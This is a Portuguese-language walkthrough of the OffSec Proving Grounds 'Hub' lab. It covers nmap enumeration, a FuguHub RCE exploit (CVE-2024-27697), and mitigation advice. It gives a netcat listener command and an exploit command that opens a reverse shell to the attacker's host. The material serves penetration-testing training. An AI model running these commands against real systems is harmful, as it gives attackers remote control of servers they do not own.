---
title:     "OffSec Proving Grounds - Hub"
tags: [Linux,easy,OffSec,CVE-2024-27697,rce]
categories: OffSecProvingGrounds
---

![image](https://github.com/user-attachments/assets/8251781c-fbb1-4ebd-9528-0550512e5506)

## Enumeration

Nesta etapa, iremos realizar a enumeração da máquina chamada `hub` utilizando a ferramenta `nmapAutomator`, que automatiza o processo de varredura com o `nmap` de forma mais eficiente e completa.

1. **Execução do nmapAutomator:**

   Utilizaremos o seguinte comando para realizar a varredura completa da máquina:

   ```
   nmapAutomator.sh -H 192.168.246.25 -t All -o nmapautomator.log
   ```
   
   - `-H 192.168.246.25`: Especifica o endereço IP da máquina alvo (`hub`).
   - `-t All`: Realiza todos os tipos de varredura, incluindo varreduras de portas, enumeração de serviços e detecção de vulnerabilidades.
   - `-o nmapautomator.log`: Salva a saída da varredura em um arquivo de log chamado `nmapautomator.log` para referência futura.
  
   ![image](https://github.com/user-attachments/assets/61335892-d8d0-4f50-91de-35818174db4a)

2. **Análise dos resultados:**

   Após a execução do `nmapAutomator`, revisaremos o arquivo de log gerado para identificar portas abertas, serviços em execução e possíveis vulnerabilidades.

3. **Enumeração avançada:**

   Com base nos resultados obtidos, focaremos em serviços específicos que possam apresentar vulnerabilidades exploráveis, como servidores web, bancos de dados, ou outros serviços críticos.

Ao analisar a porta 80, encontramos um servidor Nginx na versão 1.18.0. Podemos realizar um brute-force de diretórios utilizando a ferramenta ffuf posteriormente.

![image](https://github.com/user-attachments/assets/95afc46f-4bc6-48b6-811a-f3e382df88f8)

Já na porta 8082, encontramos um serviço que chamou nossa atenção, chamado FuguHub, conforme mostrado na imagem abaixo.

![image](https://github.com/user-attachments/assets/f6508c38-f3d9-4501-8063-1c95b835d782)


### Exploração do Serviço FuguHub

Após identificar o serviço FuguHub rodando na porta 8082, podemos realizar uma busca por vulnerabilidades conhecidas utilizando o searchsploit no Kali Linux. Essa busca pode revelar a existência de um exploit que permite a execução remota de comandos (RCE - Remote Code Execution) nesse serviço.

![image](https://github.com/user-attachments/assets/7d3a5ea3-8462-49d7-83c9-46135a410cdf)

Essa vulnerabilidade é de alta criticidade, pois permite que um atacante remoto execute comandos arbitrários no servidor, potencialmente ganhando controle total sobre o sistema.

#### Passos para a Exploração:

1. **Identificação do Exploit:**
   - Utilizamos o `searchsploit` para identificar um exploit disponível para o FuguHub, que possibilita a execução de comandos remotamente.

2. **Preparação para a Execução:**
   - Antes de executar o exploit, revisamos o código para entender como ele funciona e garantir que não haverá efeitos indesejados no ambiente de teste.

3. **Execução em Ambiente Controlado:**
   - Em um ambiente de testes controlado, executamos o exploit para verificar sua eficácia. A execução foi bem-sucedida, confirmando a presença da vulnerabilidade RCE no FuguHub.

4. **Resultados:**
   - Conseguimos executar comandos remotamente no servidor, o que nos permitiu explorar ainda mais o sistema. Abaixo, documentaremos os detalhes do exploit, incluindo o comando específico e os resultados observados.

5. **Próximos Passos:**
   - Analisar em profundidade as possibilidades que essa vulnerabilidade oferece e considerar medidas de mitigação, como a atualização do FuguHub ou a implementação de controles adicionais para proteger o sistema.

### Exploitation

Após identificar o serviço FuguHub rodando na porta 8082 e encontrar um exploit para execução remota de comandos (RCE) no `searchsploit`, tentei utilizá-lo diretamente. No entanto, o exploit disponível no Exploit-DB não funcionou conforme esperado, exigindo ajustes para que pudesse ser executado corretamente.

Para otimizar o tempo, decidi buscar alternativas e encontrei um [exploit](https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697) funcional no GitHub. Esse exploit foi testado e executado com sucesso, permitindo a exploração da vulnerabilidade de forma eficiente.

![image](https://github.com/user-attachments/assets/de772a3e-c7fe-4c62-8117-0ed51599f8c4)


#### Execução do Exploit e Reverse Shell
   - Com o exploit funcional em mãos, configurei rapidamente um listener na porta 443 usando o comando:

     ```
     nc -nlvp 443
     ```

   - Em seguida, utilizei o exploit com o comando abaixo para obter uma reverse shell:

     ```
     python3 exploit.py --rhost 192.168.246.25 --rport 8082 --lhost 192.168.45.213 --lport 443
     ```

   - Esse comando permitiu estabelecer uma conexão de reverse shell, proporcionando controle completo sobre o sistema alvo.

     ![image](https://github.com/user-attachments/assets/a090865e-6350-4bb7-bead-86141fddb529)

4. **Resultados:**
   - A execução do exploit permitiu o controle remoto do sistema, confirmando a vulnerabilidade e demonstrando a criticidade da falha.

5. **Conclusão:**
   - A utilização do exploit encontrado no GitHub foi uma escolha estratégica para otimizar o tempo e garantir a exploração bem-sucedida da vulnerabilidade, demonstrando a importância de explorar diferentes fontes de exploits disponíveis.

## Mitigation

Após a identificação e exploração da vulnerabilidade RCE no serviço FuguHub, é essencial implementar medidas de mitigação para evitar que essa vulnerabilidade seja explorada por atacantes no futuro. Abaixo estão as recomendações específicas para mitigar essa vulnerabilidade:

1. **Atualização do FuguHub:**
   - Verifique se há uma atualização disponível para o FuguHub que corrige a vulnerabilidade explorada. Manter o software atualizado é uma das melhores práticas para proteger o sistema contra explorações conhecidas.

2. **Restringir Acesso à Porta 8082:**
   - Limite o acesso à porta 8082 apenas a IPs confiáveis ou mova o serviço para uma rede interna não acessível pela internet. Isso pode ser feito configurando regras de firewall que bloqueiem o acesso externo.

3. **Implementação de Autenticação Forte:**
   - Se a atualização ou restrição de acesso não for uma opção imediata, considere implementar mecanismos de autenticação mais robustos para o serviço FuguHub. Isso pode incluir autenticação multifator (MFA) e o uso de certificados SSL/TLS para criptografar a comunicação.

4. **Monitoramento e Logging:**
   - Configure um sistema de monitoramento e logging para detectar tentativas de exploração da vulnerabilidade. Alertas podem ser configurados para notificar a equipe de segurança sobre atividades suspeitas ou não autorizadas.

5. **Desativar Funcionalidades Desnecessárias:**
   - Revise a configuração do FuguHub e desative quaisquer funcionalidades que não sejam necessárias para a operação do serviço. Isso reduz a superfície de ataque e limita as oportunidades para exploração.

6. **Segurança de Rede:**
   - Implemente segmentação de rede para isolar serviços críticos e minimizar o impacto de uma possível exploração. Redes segmentadas dificultam a movimentação lateral de um invasor dentro do ambiente.

7. **Treinamento e Conscientização:**
   - Garanta que a equipe responsável pelo gerenciamento do FuguHub esteja ciente das melhores práticas de segurança e da importância de aplicar patches e atualizações em tempo hábil.
